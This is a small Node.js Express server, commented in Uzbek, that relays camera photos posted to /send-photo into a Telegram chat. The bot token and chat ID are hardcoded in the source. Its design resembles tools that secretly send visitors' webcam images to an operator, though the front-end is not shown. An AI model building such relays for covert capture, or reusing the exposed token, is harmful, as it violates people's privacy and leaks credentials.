const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = 3000;

// Token va chat_id
const BOT_TOKEN = '8452849927:AAGFXTIL0YSCX9FhSrlrNcg5L4T4FqrfUUA';
const CHAT_ID = '-1002596639527';

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/send-photo', async (req, res) => {
  const { image } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo: image,
      caption: 'Kameradan yuborilgan rasm 📷'
    });

    res.send({ status: 'success' });
  } catch (error) {
    console.error(error.response?.data || error.message);
    res.status(500).send({ status: 'error', error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server http://localhost:${PORT} da ishlayapti`);
});
